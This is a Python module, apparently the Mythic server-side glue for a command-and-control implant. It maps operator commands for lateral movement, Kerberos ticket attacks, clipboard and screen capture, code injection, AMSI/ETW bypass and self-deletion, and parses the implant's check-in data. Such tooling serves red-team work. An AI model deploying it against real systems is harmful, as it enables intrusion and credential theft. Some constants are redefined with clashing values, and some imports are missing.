import struct
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from collections import OrderedDict
import datetime

import logging

logging.basicConfig( level=logging.INFO );

SB_CFG_JITTER   = 14;
SB_CFG_SLEEP    = 15;
SB_CFG_MASK     = 16;
SB_CFG_SC       = 17;
SB_CFG_PE       = 18;
SB_CFG_PPID     = 19;
SB_CFG_BLOCK    = 20;
SB_CFG_CURDIR   = 21;
SB_CFG_ARG      = 22;
SB_CFG_KILLDATE = 23;
SB_CFG_WORKTIME = 24;

mask_id = {
    "timer": 1,
    "none": 3
}

shellcode_id = {
    "classic": 0,
    "stomp": 1
}

pe_id = {
    "reflection": 0
}

config_id = {
    "jitter": SB_CFG_JITTER,
    "sleep":  SB_CFG_SLEEP,
    "mask":   SB_CFG_MASK,
    "injection-sc": SB_CFG_SC,
    "injection-pe":  SB_CFG_PE,
    "ppid":   SB_CFG_PPID,
    "block":  SB_CFG_BLOCK,
    "curdir": SB_CFG_CURDIR,
    "arg": SB_CFG_ARG,
    "killdate": SB_CFG_KILLDATE,
    "worktime": SB_CFG_WORKTIME
}

SB_FS_LS    = 30;
SB_FS_CAT   = 31;
SB_FS_PWD   = 32;
SB_FS_CD    = 33;
SB_FS_MV    = 34;
SB_FS_CP    = 35;
SB_FS_DEL   = 36;
SB_FS_MKDIR = 37;

SB_PS_LIST   = 20;
SB_PS_CREATE = 21;
SB_PS_KILL   = 22;

KH_CALLBACK_OUTPUT = 0x0
KH_CALLBACK_ERROR  = 0x0d

JOB_CHECKIN   = 0xf1;
JOB_GET_TASK  = 0;
JOB_POST      = 1;
JOB_NO_JOB    = 4;
JOB_QUICK_MSG = 5;
JOB_ERROR     = 6;
JOB_QUICK_OUT = 7;

BF_WHOAMI     = 5000;
BF_IPCONFIG   = 5001;
BF_CLIPDUMP   = 5002;
BF_SELFDEL    = 5003;
BF_SCREENSHOT = 5004;

BF_JMP_PSEXEC = 5051;
BF_JMP_WMI    = 5052;
BF_JMP_WINRM  = 5053;

BF_KRB_ASREP  = 5101;
BF_KRB_ASKTGT = 5102;
BF_KRB_ASKTGS = 5103;
BF_KRB_DUMP   = 5104;
BF_KRB_CHNGPW = 5105;
BF_KRB_KRBRST = 5106;
BF_KRB_KLIST  = 5107;
BF_KRB_PTT    = 5108;
BF_KRB_PURGE  = 5109;
BF_KRB_S4U    = 5110;
BF_KRB_RENEW  = 5111;
BF_KRB_TGTDEL = 5112;
BF_KRB_TRIAGE = 5113;
BF_KRB_DESCB  = 5114;
BF_KRB_HASH   = 5115;

SB_INJ_SC   = 30;
SB_INJ_PE   = 31;

T_CONFIG    = 10;
T_PROCESS   = 11;
T_FILESYS   = 12;
T_UPLOAD    = 13;
T_DOWNLOAD  = 14;
T_INFO      = 15;
T_SELFDEL   = 16;
T_EXIT      = 17;
T_SOCKS     = 18;
T_EXEC_BOF  = 19;
T_TOKEN     = 20;
T_PIVOT     = 21;
T_POSTEX    = 22;
T_SC_INJECT = 23;

SB_POSTEX_INLINE = 0;
SB_POSTEX_FORK   = 1;

SB_FORK_INIT = 0;
SB_FORK_GET  = 1;

SB_INLINE_INIT = 0;
SB_INLINE_GET  = 1;

SB_PIVOT_LINK   = 10;
SB_PIVOT_UNLINK = 11;
SB_PIVOT_LIST   = 12;

SB_DT_INLINE = 5;
SB_DT_UNLOAD = 6;
SB_DT_LIST   = 7;
SB_DT_INVOKE = 8;
SB_DT_SPAWN  = 9;

SB_CFG_SLEEP  = 15;
SB_CFG_MASK   = 16;
SB_CFG_SC     = 17;
SB_CFG_PE     = 18;
SB_CFG_PPID   = 19;
SB_CFG_BLOCK  = 20;
SB_CFG_CURDIR = 20;

SB_EXIT_T   = 20;
SB_EXIT_P   = 21;

SB_PS_LIST   = 20;
SB_PS_CREATE = 21;
SB_PS_KILL   = 22;

SB_FS_LS    = 30;
SB_FS_CAT   = 31;
SB_FS_PWD   = 32;
SB_FS_MV    = 33;
SB_FS_CP    = 34;
SB_FS_MKDIR = 35;
SB_FS_DEL   = 36;
SB_FS_CD    = 37;

Jobs = {
    "checkin":       {"hex_code": JOB_CHECKIN },
    "get_tasking":   {"hex_code": JOB_GET_TASK },
    "post_response": {"hex_code": JOB_POST },
    "error":         {"hex_code": JOB_ERROR },
    "quick_msg":     {"hex_code": JOB_QUICK_MSG},
    "quick_out":     {"hex_code": JOB_QUICK_OUT}
}

Commands = {
    # Task commands
    "info":      {"hex_code": T_INFO},
    "socks":     {"hex_code": T_SOCKS},
    "self-del":  {"hex_code": T_SELFDEL},
    "upload":    {"hex_code": T_UPLOAD},
    "download":  {"hex_code": T_DOWNLOAD},
    "exec-bof":  {"hex_code": T_EXEC_BOF},

    "bof": {
        "whoami":     {"sub": BF_WHOAMI},
        "ipconfig":   {"sub": BF_IPCONFIG},
        "clipdump":   {"sub": BF_CLIPDUMP},
        "selfdel":    {"sub": BF_SELFDEL},
        "screenshot": {"sub": BF_SCREENSHOT},

        "psexec":     {"sub": BF_JMP_PSEXEC},
        "wmi":        {"sub": BF_JMP_WMI},
        "winrm":      {"sub": BF_JMP_WINRM},

        "krb-asrep":  {"sub": BF_KRB_ASREP},
        "krb-asktgt": {"sub": BF_KRB_ASKTGT},
        "krb-asktgs": {"sub": BF_KRB_ASKTGS},
        "krb-dump":   {"sub": BF_KRB_DUMP},
        "krb-chngpw": {"sub": BF_KRB_CHNGPW},
        "krb-krbrst": {"sub": BF_KRB_KRBRST},
        "krb-klist":  {"sub": BF_KRB_KLIST},
        "krb-ptt":    {"sub": BF_KRB_PTT},
        "krb-purge":  {"sub": BF_KRB_PURGE},
        "krb-s4u":    {"sub": BF_KRB_S4U},
        "krb-renew":  {"sub": BF_KRB_RENEW},
        "krb-tgtdel": {"sub": BF_KRB_TGTDEL},
        "krb-triage": {"sub": BF_KRB_TRIAGE},
        "krb-descb":  {"sub": BF_KRB_DESCB},
        "krb-hash":   {"sub": BF_KRB_HASH}
    },

    # Exit method
    "exit": {
        "hex_code": T_EXIT,
        "subcommands": {
            "process": {"sub": SB_EXIT_P},
            "thread" : {"sub": SB_EXIT_T}
        }
    },
    
    # Filesystem command with subcommands
    "fs": {
        "hex_code": T_FILESYS,
        "subcommands": {
            "ls":    {"sub": SB_FS_LS},
            "cat":   {"sub": SB_FS_CAT},
            "pwd":   {"sub": SB_FS_PWD},
            "cd":    {"sub": SB_FS_CD},
            "mv":    {"sub": SB_FS_MV},
            "cp":    {"sub": SB_FS_CP},
            "rm":    {"sub": SB_FS_DEL},
            "mkdir": {"sub": SB_FS_MKDIR}
        }
    },
    
    # Configuration command with subcommands
    "config": {
        "hex_code": T_CONFIG,
    },
    
    # Process command with subcommands
    "proc": {
        "hex_code": T_PROCESS,
        "subcommands": {
            "run" : {"sub": SB_PS_CREATE},
            "list": {"sub": SB_PS_LIST},
            "cmd" : {"sub": SB_PS_CREATE},
            "pwsh": {"sub": SB_PS_CREATE},
            "kill": {"sub": SB_PS_KILL}
        }
    },

    "pivot": {
        "hex_code": T_PIVOT,
        "subcommands": {
            "link"  : {"sub" : SB_PIVOT_LINK},
            "unlink": {"sub" : SB_PIVOT_UNLINK},
            "list"  : {"sub" : SB_PIVOT_LIST},
        }
    },

    "post_ex": {
        "hex_code": T_POSTEX,
        "subcommands": {
            "inline": {
                    "sub": SB_POSTEX_INLINE, 
                    "step_init": SB_INLINE_INIT, 
                    "step_get": SB_INLINE_GET
                },
            "fork"  : {
                "sub": SB_POSTEX_FORK, 
                "step_init": SB_FORK_INIT,   
                "step_get": SB_FORK_GET
            },
        }
    }
};

class Parser:
    buffer: bytes = b'';
    length: int   = 0;

    def __init__( self, buffer, length ):

        self.buffer = buffer;
        self.length = length;

        return;

    def Int16( self ):

        val = struct.unpack( ">h", self.buffer[ :2 ] );
        self.buffer = self.buffer[ 2: ];

        return val[ 0 ];

    def Int32( self ) -> int:

        val = struct.unpack( ">i", self.buffer[ :4 ] );
        self.buffer = self.buffer[ 4: ];

        return val[ 0 ];

    def Int64( self ):

        val = struct.unpack( ">q", self.buffer[ :8 ] );
        self.buffer = self.buffer[ 8: ];

        return val[ 0 ];

    def Bytes( self ) -> bytes:

        length      = self.Int32();

        buf         = self.buffer[ :length ];
        self.buffer = self.buffer[ length: ];

        return buf;

    def Pad( self, length: int ) -> bytes:

        buf         = self.buffer[ :length ];
        self.buffer = self.buffer[ length: ];

        return buf;

    def Str( self ) -> str:
        return self.Bytes().decode('utf-8', errors="replace");
    
    def Wstr( self ):
        return self.Bytes().decode( 'utf-16' );

    def All( self ) -> bytes:
        remaining = self.buffer
        self.buffer = b''
        return remaining
    

async def UpdateConfigStorage(task: PTTaskMessageAllData, config_params: dict) -> bool:
    """
    Updates agent configuration in storage without generating callbacks.
    Handles the complete delete-and-recreate workflow required by Mythic's storage system.
    
    Args:
        task: PTTaskMessageAllData - The current task context
        config_params: dict - Dictionary of {parameter_name: value} to update
        
    Returns:
        bool - True if successful, False if any step failed
    """
    try:
        # 1. First try to extract existing configuration
        existing_config = {}
        try:
            existing_config = await StorageExtract(task.Task.AgentCallbackID)
        except Exception as e:
            logging.warning(f"Couldn't extract existing config, starting fresh: {str(e)}")
        
        # 2. Delete existing storage
        if not await DeleteStorage(task.Task.AgentCallbackID):
            logging.error("Failed to delete existing storage")
            return False

        # 3. Prepare default configuration structure
        default_config = {
            "basic_info": {
                "username": "",
                "hostname": "",
                "netbios": "",
                "process_id": 0,
                "image_path": "",
                "internal_ip": ["0.0.0.0"],
                "architecture": "x64"
            },
            "evasion": {
                "syscall_enabled": False,
                "stack_spoof_enabled": False,
                "bof_hook_api_enabled": False,
                "bypass_dotnet": "None",
                "dotnet_bypass_exit": 0
            },
            "injection": {
                "alloc_method": 0,
                "write_method": 0
            },
            "killdate": {
                "enabled": False,
                "exit_method": 0,
                "self_delete": False,
                "date": "1970-01-01"
            },
            "process_info": {
                "command_line": "",
                "heap_address": "0x00000000",
                "elevated": False,
                "jitter": "0%",
                "sleep_time": "0ms",
                "parent_id": 0,
                "process_arch": 0,
                "kharon_base": "0x0000000000000000",
                "kharon_len": 0,
                "thread_id": 0
            }
        }

        # 4. Merge existing config with defaults (if available)
        current_config = {**default_config, **existing_config} if existing_config else default_config

        # 5. Process each parameter update
        for param, value in config_params.items():
            if param == "bypass":
                current_config["evasion"]["bypass_dotnet"] = {
                    "all": 0x100,
                    "amsi": 0x400,
                    "etw": 0x700
                }.get(str(value).lower(), 0x000)
                
            elif param == "syscall":
                current_config["evasion"]["syscall_enabled"] = bool(value)
                
            elif param == "stack-spoof":
                current_config["evasion"]["stack_spoof_enabled"] = bool(value)
                
            elif param == "sleep":
                current_config["process_info"]["sleep_time"] = f"{int(value)}ms"
                
            elif param == "jitter":
                jitter = max(0, min(100, int(value)))
                current_config["process_info"]["jitter"] = f"{jitter}%"
                
            elif param == "killdate":
                try:
                    datetime.datetime.strptime(value, "%Y-%m-%d")
                    current_config["killdate"]["date"] = value
                    current_config["killdate"]["enabled"] = True
                except ValueError:
                    logging.warning(f"Invalid killdate format: {value}")
                    
            elif param == "ppid":
                current_config["process_info"]["parent_id"] = max(0, int(value))
                
            elif param == "self-delete":
                current_config["killdate"]["self_delete"] = bool(value)
                
            elif param == "exit":
                current_config["killdate"]["exit_method"] = 0 if str(value).lower() == "thread" else 1
                
        rm_bool = await DeleteStorage( task.Callback.AgentCallbackID )

        add_resp = await SendMythicRPCAgentStorageCreate(MythicRPCAgentstorageCreateMessage(
            UniqueID=task.Task.AgentCallbackID,
            DataToStore=base64.b64encode(json.dumps(current_config).encode('utf-8')).decode('utf-8')
        ))

        if not add_resp.Success:
            logging.error("Failed to create new storage with updated config")
            return False

        return True

    except Exception as e:
        logging.error(f"Critical error in UpdateConfigStorage: {str(e)}")
        return False

async def DeleteStorage( UUID ) -> bool:
    resp = await SendMythicRPCAgentStorageRemove( MythicRPCAgentStorageRemoveMessage(
        UUID
    ) )

    return resp.Success

async def StorageExtract( UUID ):
    """Extract and organize all agent storage data efficiently"""

    search_resp: MythicRPCAgentStorageSearchMessageResponse = await SendMythicRPCAgentStorageSearch(MythicRPCAgentStorageSearchMessage(
        UUID
    ))

    AgentStorage = b''

    for i in search_resp.AgentStorageMessages:
        AgentStorage = base64.b64decode( base64.b64decode( i["data"] ) )

    Psr = Parser(AgentStorage, len(AgentStorage))
    
    logging.info(f"data agent: {AgentStorage}")

    # Architecture detection
    OsArch = Psr.Pad(1)
    OscArc = "unknown"
    if isinstance(OsArch, bytes):
        OsArch = int.from_bytes(OsArch, byteorder='big', signed=False)
    OscArc = "x64" if OsArch == 0x64 else "x86" if OsArch == 0x86 else OscArc

    # Basic Info
    username = Psr.Str()
    hostname = Psr.Str()
    netbios = Psr.Str()
    process_id = Psr.Int32()
    image_path = Psr.Str()
    internal_ip = ["0.0.0.0"]  # Default value
    architecture = OscArc

    ascii_cp = Psr.Int32()
    oem_cp   = Psr.Int32()

    # Injection
    alloc_method = Psr.Int32()
    write_method = Psr.Int32()

    # Evasion
    syscall_enabled = bool(Psr.Int32())
    stack_spoof_enabled = bool(Psr.Int32())
    bof_hook_api_enabled = bool(Psr.Int32())
    bypass_dotnet = Psr.Int32()
    dotnet_patchexit = Psr.Int32()

    if bypass_dotnet == 0x100:
        bypass_dotnet = "AMSI and ETW"
    elif bypass_dotnet == 0x400:
        bypass_dotnet = "AMSI"
    elif bypass_dotnet == 0x700:
        bypass_dotnet = "ETW"
    else:
        bypass_dotnet = "None"

    # Killdate
    killdate_enabled = bool(Psr.Int32())
    exit_method = Psr.Int32()
    self_delete = bool(Psr.Int32())
    killdate_year = Psr.Int16()
    killdate_month = Psr.Int16()
    killdate_day = Psr.Int16()
    killdate_date = f"{killdate_year}-{killdate_month:02d}-{killdate_day:02d}"

    # Process Info
    command_line = Psr.Str()
    heap_address = f"0x{Psr.Int32():08X}"
    elevated = bool(Psr.Int32())
    jitter = f"{Psr.Int32()}%"
    sleep_time = f"{Psr.Int32()}ms"
    parent_id = Psr.Int32()
    process_arch = Psr.Int32()
    kharon_base = f"0x{Psr.Int64():016X}"
    kharon_len = Psr.Int32()
    thread_id = Psr.Int32()

    # Mask Info
    jmp_gadget = f"0x{Psr.Int64():016X}"
    ntcontinue_gadget = f"0x{Psr.Int64():016X}"
    technique_id = Psr.Int32()

    # Process Context
    parent = Psr.Int32()
    pipe = Psr.Int32()
    current_dir = Psr.Str()
    block_dlls = bool(Psr.Int32())

    # System Resources
    processor_name = Psr.Str()
    total_ram = f"{Psr.Int32()}MB"
    available_ram = f"{Psr.Int32()}MB"
    used_ram = f"{Psr.Int32()}MB"
    ram_usage = f"{Psr.Int32()}%"
    processor_count = Psr.Int32()

    # Encryption Key
    encrypt_key = Psr.Pad( 16 )

    # Build the JSON structure
    data = {
        "basic_info": {
            "username": username,
            "hostname": hostname,
            "netbios": netbios,
            "process_id": process_id,
            "image_path": image_path,
            "internal_ip": internal_ip,
            "architecture": architecture
        },
        "injection": {
            "alloc_method": alloc_method,
            "write_method": write_method
        },
        "evasion": {
            "syscall_enabled": syscall_enabled,
            "stack_spoof_enabled": stack_spoof_enabled,
            "bof_hook_api_enabled": bof_hook_api_enabled,
            "bypass_dotnet": bypass_dotnet,
            "dotnet_bypass_exit": dotnet_patchexit
        },
        "killdate": {
            "enabled": killdate_enabled,
            "exit_method": exit_method,
            "self_delete": self_delete,
            "date": killdate_date
        },
        "process_info": {
            "command_line": command_line,
            "heap_address": heap_address,
            "elevated": elevated,
            "jitter": jitter,
            "sleep_time": sleep_time,
            "parent_id": parent_id,
            "process_arch": process_arch,
            "kharon_base": kharon_base,
            "kharon_len": kharon_len,
            "thread_id": thread_id
        },
        "mask_info": {
            "jmp_gadget": jmp_gadget,
            "ntcontinue_gadget": ntcontinue_gadget,
            "technique_id": technique_id
        },
        "process_context": {
            "parent": parent,
            "pipe": pipe,
            "current_dir": current_dir,
            "block_dlls": block_dlls
        },
        "system_resources": {
            "processor_name": processor_name,
            "total_ram": total_ram,
            "available_ram": available_ram,
            "used_ram": used_ram,
            "ram_usage": ram_usage,
            "processor_count": processor_count
        },

        "encryption_key": encrypt_key
    }

    return data


async def default_completion_callback(completionMsg: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    out = ""
    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success", Completed=True)
    responses = await SendMythicRPCResponseSearch(MythicRPCResponseSearchMessage(TaskID=completionMsg.SubtaskData.task.ID))
    responses
    for output in responses.Responses:
        out += str(output.Response)
            
    await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
        TaskID=completionMsg.TaskData.task.ID,
        Response=f"{out}"
    ))
    return response

class CallbackCommandBase(CommandBase):
    completion_functions = {"completion_callback": default_completion_callback}
    
async def get_content_by_name( name, taskid ) -> bytes:
    file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
        TaskID=taskid,
        Filename=name,    
        LimitByCallback=False,
        MaxResults=1
    ))

    if file_resp.Error and len(file_resp.Files) < 0:
        return b""
     
    file_contents = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
        AgentFileId=file_resp.Files[0].AgentFileId
    ))

    return file_contents.Content    

async def write_console( TaskID, Msg ) -> None:
    await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
        TaskID=TaskID,
        Response=Msg
    ))